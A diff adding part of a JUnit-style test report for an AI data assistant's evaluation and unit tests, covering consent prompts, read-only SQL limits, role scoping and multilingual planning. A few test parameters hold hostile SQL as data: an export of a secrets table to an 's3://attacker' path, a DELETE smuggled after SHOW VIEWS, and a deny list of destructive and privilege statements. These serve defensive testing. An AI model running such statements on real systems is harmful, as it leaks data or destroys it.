+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_an_sql_turn_keeps_the_loop_s_own_ceiling" time="0.010" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_scaling_can_never_raise_a_limit" time="0.022" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_checked_sql_goes_into_the_editor_as_an_added_suggestion" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_question_back_is_an_answer_not_a_refusal" time="0.004" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_page_without_the_editor_action_gets_no_proposal" time="0.005" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_suggested_edit_is_explained_in_the_person_s_words" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_sql_that_fails_its_check_never_reaches_the_editor" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_the_model_cannot_propose_sql_that_was_never_checked" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_slow_model_call_ends_with_the_turn_s_time_budget" time="1.502" />
+    <testcase classname="tests.eval.test_neva_semantic_view_action" name="test_creation_executes_write_tool_after_approval[Buatkan Semantic View sales dari tabel sales.orders.]" time="0.002" />
+    <testcase classname="tests.eval.test_neva_semantic_view_action" name="test_creation_executes_write_tool_after_approval[Create and publish a Semantic View from sales.orders.]" time="0.002" />
+    <testcase classname="tests.eval.test_neva_semantic_view_action" name="test_creation_executes_write_tool_after_approval[Crea una vista sem\xe1ntica para sales.orders.]" time="0.002" />
+    <testcase classname="tests.eval.test_neva_semantic_view_action" name="test_creation_executes_write_tool_after_approval[Cr\xe9e une vue s\xe9mantique depuis sales.orders.]" time="0.003" />
+    <testcase classname="tests.eval.test_neva_semantic_view_action" name="test_creation_executes_write_tool_after_approval[sales.orders \u304b\u3089\u30bb\u30de\u30f3\u30c6\u30a3\u30c3\u30af\u30d3\u30e5\u30fc\u3092\u4f5c\u6210\u3057\u3066]" time="0.002" />
+    <testcase classname="tests.eval.test_neva_semantic_view_action" name="test_denied_creation_does_not_run" time="0.001" />
+    <testcase classname="tests.eval.test_neva_semantic_view_action" name="test_create_request_cannot_finish_with_draft_only" time="0.001" />
+    <testcase classname="tests.eval.test_neva_semantic_view_list" name="test_lists_what_the_role_can_open" time="0.001" />
+    <testcase classname="tests.eval.test_neva_semantic_view_list" name="test_a_role_with_no_views_gets_an_empty_list_not_others" time="0.001" />
+    <testcase classname="tests.eval.test_neva_semantic_view_list" name="test_no_session_no_list" time="0.000" />
+    <testcase classname="tests.eval.test_neva_surface_trajectory" name="test_role_deictic_request_after_workspace_surface_switch" time="0.002" />
+    <testcase classname="tests.eval.test_neva_typed_workflows" name="test_grant_without_verified_postcondition_never_composes_success" time="0.001" />
+    <testcase classname="tests.eval.test_neva_typed_workflows" name="test_current_query_error_is_inspected_without_consent" time="0.002" />
+    <testcase classname="tests.eval.test_neva_typed_workflows" name="test_unlinked_query_repair_cannot_claim_success" time="0.001" />
+    <testcase classname="tests.eval.test_neva_typed_workflows" name="test_correlated_patch_and_successful_rerun_complete_repair" time="0.001" />
+    <testcase classname="tests.eval.test_neva_typed_workflows" name="test_studio_configuration_inspection_never_uses_studio_conversation" time="0.001" />
+    <testcase classname="tests.eval.test_news_investigation_trajectory" name="test_the_mission_incident_is_read_by_reference" time="0.004" />
+    <testcase classname="tests.eval.test_news_investigation_trajectory" name="test_incident_tools_need_consent" time="0.002" />
+    <testcase classname="tests.eval.test_news_investigation_trajectory" name="test_a_finding_with_invented_evidence_is_refused_and_not_stored" time="0.002" />
+    <testcase classname="tests.eval.test_nova_streams_skill" name="test_neva_loads_stream_playbook_without_mutation[Draft CREATE STREAM for analytics.orders; do not execute.-Draft only, not run.\n```sql\nCREATE STREAM analytics.orders_stream ON TABLE analytics.orders APPEND_ONLY = TRUE;\n```]" time="0.008" />
+    <testcase classname="tests.eval.test_nova_streams_skill" name="test_neva_loads_stream_playbook_without_mutation[Explain s versus analytics.s versus analytics.default.s.-With analytics active, all three identify the same Stream.]" time="0.014" />
+    <testcase classname="tests.eval.test_nova_streams_skill" name="test_neva_loads_stream_playbook_without_mutation[Execute CREATE STREAM analytics.s on analytics.orders.-Creating it changes the database, so I need your approval before I run it.]" time="0.013" />
+    <testcase classname="tests.eval.test_nova_streams_skill" name="test_neva_loads_stream_playbook_without_mutation[Explain DROP STREAM analytics.s; I have not approved deletion.-DROP requires confirmation. Nothing was dropped.]" time="0.014" />
+    <testcase classname="tests.eval.test_nova_streams_skill" name="test_neva_loads_stream_playbook_without_mutation[Explain a task WHEN NOVA_STREAM_HAS_DATA('analytics.s').-It runs when the stream has data, after ALTER TASK \u2026 RESUME. No task was created.]" time="0.014" />
+    <testcase classname="tests.eval.test_parallel_read_only_tools" name="test_two_read_only_calls_overlap_and_keep_their_order" time="0.304" />
+    <testcase classname="tests.eval.test_parallel_read_only_tools" name="test_non_iterative_loop_stays_serial" time="0.605" />
+    <testcase classname="tests.eval.test_parallel_read_only_tools" name="test_calls_that_need_approval_are_not_started_early" time="0.606" />
+    <testcase classname="tests.eval.test_parallel_read_only_tools" name="test_workflow_flag_keeps_independent_reads_concurrent_with_a_barrier" time="0.304" />
+    <testcase classname="tests.eval.test_parallel_read_only_tools" name="test_mission_or_active_ordered_hook_prevents_early_dispatch[mission-None]" time="0.000" />
+    <testcase classname="tests.eval.test_parallel_read_only_tools" name="test_mission_or_active_ordered_hook_prevents_early_dispatch[None-&lt;lambda&gt;]" time="0.000" />
+    <testcase classname="tests.eval.test_published_view_agent_trajectory" name="test_bound_published_view_trajectory_uses_consent_and_finishes" time="0.039" />
+    <testcase classname="tests.eval.test_quality_read_only_trajectory" name="test_evaluation_cannot_bypass_read_only_with_consent_free_tool[True]" time="0.002" />
+    <testcase classname="tests.eval.test_quality_read_only_trajectory" name="test_evaluation_cannot_bypass_read_only_with_consent_free_tool[False]" time="0.002" />
+    <testcase classname="tests.eval.test_read_grant_context" name="test_dispatch_and_prefetch_require_the_approving_context[changed0]" time="0.002" />
+    <testcase classname="tests.eval.test_read_grant_context" name="test_dispatch_and_prefetch_require_the_approving_context[changed1]" time="0.001" />
+    <testcase classname="tests.eval.test_read_grant_context" name="test_dispatch_and_prefetch_require_the_approving_context[changed2]" time="0.001" />
+    <testcase classname="tests.eval.test_read_grant_context" name="test_dispatch_and_prefetch_require_the_approving_context[changed3]" time="0.001" />
+    <testcase classname="tests.eval.test_read_grant_context" name="test_dispatch_and_prefetch_require_the_approving_context[changed4]" time="0.001" />
+    <testcase classname="tests.eval.test_security_context_boundary" name="test_finance_observations_never_enter_marketing_context" time="0.000" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_unresolved_semantic_concept_finishes_as_clarification" time="0.004" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_clarification_turn_cannot_run_more_tools" time="0.003" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_a_model_that_keeps_calling_tools_still_ends_as_the_clarification" time="0.003" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_studio_runs_the_governed_tool_itself_when_the_model_will_not" time="0.003" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_a_request_outside_the_catalog_ends_as_out_of_scope_not_a_failure" time="0.004" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_an_unbacked_number_after_a_failed_query_is_still_refused" time="0.003" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_a_turn_that_holds_results_answers_from_them_even_after_a_clarification" time="0.003" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_a_direct_agent_still_fails_when_a_required_capability_never_runs" time="0.043" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_a_direct_ml_turn_asks_for_the_data_again_without_the_ml_steps" time="0.035" />
+    <testcase classname="tests.eval.test_semantic_clarification_trajectory" name="test_a_compound_turn_that_answers_with_a_question_is_sent_to_query_its_parts" time="0.048" />
+    <testcase classname="tests.eval.test_semantic_guidance_fallback" name="test_natural_guidance_runs_through_consent_and_returns_grounded_result" time="0.035" />
+    <testcase classname="tests.eval.test_semantic_hardening" name="test_text_only_action_executes_with_consent_and_composes_from_evidence" time="0.004" />
+    <testcase classname="tests.eval.test_semantic_hardening" name="test_invalid_text_only_action_cannot_run_or_answer_with_data" time="0.002" />
+    <testcase classname="tests.eval.test_semantic_latest_month" name="test_latest_month_trajectory_uses_consent_and_completes" time="0.047" />
+    <testcase classname="tests.eval.test_skill_authoring" name="test_skill_authoring_uses_bounded_engine_without_executing_tools" time="0.002" />
+    <testcase classname="tests.eval.test_skill_authoring" name="test_private_skill_load_trajectory_preserves_owner_and_consent_boundaries" time="0.015" />
+    <testcase classname="tests.eval.test_skill_authoring" name="test_personal_skill_with_credentials_is_never_loaded" time="0.001" />
+    <testcase classname="tests.eval.test_sql_copilot_trajectory" name="test_draft_repairs_syntax_without_consent_or_execution" time="0.024" />
+    <testcase classname="tests.eval.test_sql_copilot_trajectory" name="test_write_requires_approval_even_with_read_only_grant" time="0.002" />
+    <testcase classname="tests.eval.test_sql_copilot_trajectory" name="test_denied_write_never_runs" time="0.002" />
+    <testcase classname="tests.eval.test_sql_copilot_trajectory" name="test_protected_role_rejected_before_execution" time="0.001" />
+    <testcase classname="tests.eval.test_sql_copilot_trajectory" name="test_protected_password_is_transient_and_never_model_input" time="0.002" />
+    <testcase classname="tests.eval.test_sql_copilot_trajectory" name="test_multi_step_sql_workflow_remains_bounded_and_approved" time="0.004" />
+    <testcase classname="tests.eval.test_studio_business_catalog" name="test_catalog_trajectory_blocks_queries[data apa saja yang kamu punya]" time="0.003" />
+    <testcase classname="tests.eval.test_studio_business_catalog" name="test_catalog_trajectory_blocks_queries[What data can you help me with?]" time="0.003" />
+    <testcase classname="tests.eval.test_studio_business_catalog" name="test_catalog_trajectory_blocks_queries[Sumber lain yang tersedia apa?]" time="0.003" />
+    <testcase classname="tests.eval.test_studio_business_catalog" name="test_catalog_trajectory_blocks_queries[Kamu bisa bantu apa?]" time="0.003" />
+    <testcase classname="tests.eval.test_studio_business_catalog" name="test_catalog_cannot_be_skipped_by_unsupported_answer" time="0.001" />
+    <testcase classname="tests.eval.test_studio_business_catalog" name="test_an_analyst_turn_keeps_the_analysis_tools_its_owner_enabled" time="0.004" />
+    <testcase classname="tests.eval.test_studio_business_catalog" name="test_the_model_is_shown_the_rows_it_is_asked_to_write_about" time="0.002" />
+    <testcase classname="tests.eval.test_studio_lifecycle_closure" name="test_governed_lifecycle_survives_objective_separation_replay_and_next_session" time="1.340" />
+    <testcase classname="tests.eval.test_studio_lifecycle_closure" name="test_same_turn_provider_uses_canonical_hypotheses_after_final_verification[False-False]" time="0.336" />
+    <testcase classname="tests.eval.test_studio_lifecycle_closure" name="test_same_turn_provider_uses_canonical_hypotheses_after_final_verification[True-False]" time="0.171" />
+    <testcase classname="tests.eval.test_studio_lifecycle_closure" name="test_same_turn_provider_uses_canonical_hypotheses_after_final_verification[False-True]" time="0.273" />
+    <testcase classname="tests.eval.test_studio_no_raw_sql_substitute" name="test_studio_reports_the_missing_governed_tool" time="0.001" />
+    <testcase classname="tests.eval.test_studio_no_raw_sql_substitute" name="test_neva_may_still_use_read_only_sql_for_the_same_plan" time="0.002" />
+    <testcase classname="tests.eval.test_studio_planner_fallback" name="test_governed_metric_question_falls_back_to_the_semantic_tool" time="0.023" />
+    <testcase classname="tests.eval.test_studio_planner_fallback" name="test_the_fallback_does_not_read_the_question_in_any_language" time="0.039" />
+    <testcase classname="tests.eval.test_studio_planner_fallback" name="test_a_studio_agent_without_a_view_falls_back_to_clarification" time="0.002" />
+    <testcase classname="tests.eval.test_studio_planner_fallback" name="test_neva_falls_back_to_a_read_only_plan_when_planning_fails" time="0.004" />
+    <testcase classname="tests.eval.test_studio_resource_scope" name="test_resource_scope_in_production_loop[sales_docs-filters0-True]" time="0.014" />
+    <testcase classname="tests.eval.test_studio_resource_scope" name="test_resource_scope_in_production_loop[sales_docs-filters1-False]" time="0.004" />
+    <testcase classname="tests.eval.test_studio_resource_scope" name="test_resource_scope_in_production_loop[finance-filters2-False]" time="0.002" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_planner_repairs_one_malformed_response_without_a_lexical_fallback" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Bisa bantu merancang Semantic View saya?-capability_help-tools0-required0]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Can you help design a Semantic View?-capability_help-tools1-required1]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Expl\xedcame c\xf3mo crear una vista sem\xe1ntica-capability_help-tools2-required2]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Quel est le chiffre d'affaires ce mois-ci ?-semantic_analytics-tools3-required3]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Zeige den Umsatz dieses Monats-raw_sql_query-tools4-required4]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[\u4eca\u6708\u306e\u58f2\u4e0a\u3092\u8868\u793a\u3057\u3066-raw_sql_query-tools5-required5]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[\u0623\u0638\u0647\u0631 \u0645\u0628\u064a\u0639\u0627\u062a \u0647\u0630\u0627 \u0627\u0644\u0634\u0647\u0631-raw_sql_query-tools6-required6]" time="0.003" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Mostre as vendas deste m\xeas-raw_sql_query-tools7-required7]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[\uc774\ubc88 \ub2ec \ub9e4\ucd9c\uc744 \ubcf4\uc5ec\uc918-raw_sql_query-tools8-required8]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Create a chart from my previous result-chart-tools9-required9]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_requests_reach_the_same_provider_plan_contract[Forecast sales for 30 days-machine_learning-tools10-required10]" time="0.001" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_missing_semantic_tool_maps_to_registered_read_only_query" time="0.000" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_invalid_or_unauthorized_plan_fails_closed[payload0]" time="0.000" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_invalid_or_unauthorized_plan_fails_closed[payload1]" time="0.000" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_invalid_or_unauthorized_plan_fails_closed[payload2]" time="0.000" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_invalid_or_unauthorized_plan_fails_closed[payload3]" time="0.000" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_invalid_or_unauthorized_plan_fails_closed[payload4]" time="0.000" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_invalid_or_unauthorized_plan_fails_closed[payload5]" time="0.000" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_data_turn_executes_required_tool_with_consent[Tampilkan transaksi bulan ini]" time="0.002" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_data_turn_executes_required_tool_with_consent[Show this month's transactions]" time="0.002" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_data_turn_executes_required_tool_with_consent[Montre les transactions de ce mois]" time="0.002" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_data_turn_executes_required_tool_with_consent[\u4eca\u6708\u306e\u53d6\u5f15\u3092\u8868\u793a\u3057\u3066]" time="0.002" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_multilingual_data_turn_executes_required_tool_with_consent[\u0623\u0638\u0647\u0631 \u0645\u0639\u0627\u0645\u0644\u0627\u062a \u0647\u0630\u0627 \u0627\u0644\u0634\u0647\u0631]" time="0.002" />
+    <testcase classname="tests.eval.test_turn_planning" name="test_a_plan_naming_an_unregistered_tool_is_replaced_by_a_safe_plan" time="0.001" />
+    <testcase classname="tests.eval.test_ui_autocompose_trajectory" name="test_a_charted_answer_gets_no_extra_visual_or_provider_call" time="0.008" />
+    <testcase classname="tests.eval.test_ui_autocompose_trajectory" name="test_participant_gate_preserves_the_map_for_user_answers" time="0.127" />
+    <testcase classname="tests.eval.test_ui_autocompose_trajectory" name="test_a_charted_located_result_still_gets_its_map" time="0.117" />
+    <testcase classname="tests.eval.test_ui_autocompose_trajectory" name="test_a_rejected_program_on_a_located_result_still_shows_its_map" time="0.298" />
+    <testcase classname="tests.eval.test_ui_autocompose_trajectory" name="test_located_result_gets_a_governed_map" time="0.166" />
+    <testcase classname="tests.eval.test_ui_autocompose_trajectory" name="test_a_plain_data_answer_gets_a_ranking_on_the_same_stream" time="0.226" />
+    <testcase classname="tests.eval.test_view_listing_repair" name="test_view_listing_repair_preserves_consent_and_user_identity[False]" time="0.003" />
+    <testcase classname="tests.eval.test_view_listing_repair" name="test_view_listing_repair_preserves_consent_and_user_identity[True]" time="0.004" />
+    <testcase classname="tests.eval.test_web_search_trajectory" name="test_switched_on_agent_searches_and_cites_untrusted_web_sources" time="0.004" />
+    <testcase classname="tests.eval.test_web_search_trajectory" name="test_switched_off_agent_is_never_offered_web_search" time="0.027" />
+    <testcase classname="tests.eval.test_web_search_trajectory" name="test_without_a_key_the_agent_says_web_search_is_not_configured" time="0.003" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_pending_card_accepts_an_immediate_decision[True]" time="0.003" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_pending_card_accepts_an_immediate_decision[False]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_pending_card_accepts_an_immediate_decision[None]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_closing_at_pending_card_cancels_prepared_consent" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_cancelled_consent_is_removed_without_touching_reused_call_id" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_event_names_and_shapes_are_frozen" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_thread_store_scopes_threads_to_owner" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_consent_policy_only_covers_read_only" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_thread_state_is_not_persisted_anywhere" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_loop_emits_text_and_done_on_a_plain_answer" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_loop_opens_with_a_plan_then_thinking_before_answer" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_a_no_consent_tool_runs_without_prompting_while_a_query_still_prompts" time="0.014" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_default_requires_consent_is_true" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_loop_announces_a_skill_load_as_its_own_step" time="0.014" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_loop_forwards_each_streamed_fragment_as_its_own_delta" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_router_stored_user_message_is_not_duplicated_to_the_provider" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_two_turns_do_not_duplicate_or_lose_user_messages" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_build_messages_keeps_a_genuine_repeat_question" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_latest_thread_result_is_bounded_and_uses_newest_table" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_tool_detail_drops_readback_payloads" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_loop_stops_at_the_iteration_cap" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_loop_enforces_time_budget" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_read_only_grant_skips_the_approval_prompt" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_destructive_call_never_auto_approves_even_with_a_grant" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_denied_tool_call_is_surfaced_and_not_rerun" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_tool_failure_terminates_the_turn" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_provider_resolve_skips_providers_without_a_readable_key" time="0.004" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_provider_raises_when_nothing_is_configured" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_provider_resolve_honours_the_selected_model" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_provider_resolve_rejects_an_unregistered_model" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_provider_resolve_rejects_an_unknown_provider" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_chat_endpoint_composition_matches_ai_functions" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_consent_broker_resolves_a_waiting_future" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_consent_broker_cancels_all_on_shutdown" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_consent_broker_forgets_the_thread_once_resolved" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_consent_broker_rejects_a_duplicate_tool_call_id" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_duplicate_open_does_not_orphan_the_first_future" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_clashing_id_is_reusable_once_the_first_entry_is_gone" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_foreign_user_cannot_resolve_someone_elses_tool_call" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_foreign_deny_does_not_terminate_the_owners_call" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_b" name="test_every_assistant_route_requires_authentication" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_returns_scoped_repair_without_engine_call[SHOW VIEWS]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_returns_scoped_repair_without_engine_call[show views from NOVA_SALES;]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_returns_scoped_repair_without_engine_call[SHOW\nVIEWS]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_repair_does_not_override_policy_refusal[SHOW VIEWS; DELETE FROM facts]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_show_views_repair_does_not_override_policy_refusal[/* inspect */ SHOW VIEWS]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_other_view_queries_keep_the_existing_execution_path[SHOW CREATE VIEW db1.orders]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_other_view_queries_keep_the_existing_execution_path[SELECT 'SHOW VIEWS' AS label]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_read_only_statement_runs_through_query_service" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_tool_never_imports_asyncmy_or_the_db_module_and_never_opens_a_socket" time="0.005" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_bounded_preview_truncates_a_wide_result" time="0.003" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[DROP TABLE x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[TRUNCATE TABLE x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[DELETE FROM x]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[UPDATE x SET a = 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[ALTER TABLE x DROP COLUMN c]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[GRANT SELECT ON x TO u]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[REVOKE SELECT ON x FROM u]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[SET role = 'admin']" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[CREATE TABLE x (a INT)]" time="0.002" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[INSERT INTO x VALUES (1)]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[COPY INTO x FROM 's3://b']" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[CREATE ML_MODEL m TYPE = FORECAST TARGET = y AS SELECT 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_denied_statement_is_refused_before_the_engine[CREATE TASK t AS SELECT 1]" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_payload_cannot_smuggle_a_denied_statement" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_mixed_payload_is_destructive_and_pure_denied_is_denied" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_nova_ddl_is_recognised_as_denied" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT * FROM secrets INTO OUTFILE 's3://attacker/leak.csv' FORMAT AS CSV]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT /* hide */ 1 INTO OUTFILE 's3://b/x']" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV -- trailing]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[EXPLAIN SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[SELECT * FROM t INTO @stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_write_clause_under_read_only_keyword_is_denied[INSERT INTO FILES('path'='s3://b/x') SELECT * FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[SELECT 1 INTO@stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[SELECT 1 INTO  @stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[SELECT 1 INTO\n@stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[WITH x AS (SELECT 1) SELECT * FROM x INTO@stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_denied[EXPLAIN SELECT 1 INTO@stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT 'INTO@stage' AS note]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT 'INTO @stage' AS note]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT 'INTOOUTFILE' AS note]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_literal_and_identifier_spellings_stay_allowed[SELECT into_at FROM t]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_zero_gap_into_stage_is_refused_before_the_engine" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_grant_never_auto_approves_zero_gap_into_stage" time="0.001" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_write_clause_payload_is_not_read_only[SELECT 1; SELECT 1 INTO OUTFILE 's3://b/x']" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_multi_statement_write_clause_payload_is_not_read_only[SELECT 1; SELECT * FROM t INTO @stage1.x.csv]" time="0.000" />
+    <testcase classname="tests.unit.test_assistant_stage_c" name="test_into_outfile_is_refused_before_the_engine" time="0.001" />
